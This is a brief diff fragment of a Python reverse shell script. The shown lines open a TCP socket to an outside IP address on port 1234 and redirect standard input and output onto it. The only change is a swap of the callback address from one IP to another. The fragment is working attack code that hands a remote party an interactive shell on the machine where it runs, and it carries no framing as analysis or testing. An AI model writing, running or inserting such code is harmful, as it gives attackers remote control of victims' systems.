@@ -4,7 +4,7 @@ import os
 import pty
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("51.12.54.145", 1234))
+s.connect(("141.95.98.213", 1234))
 
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
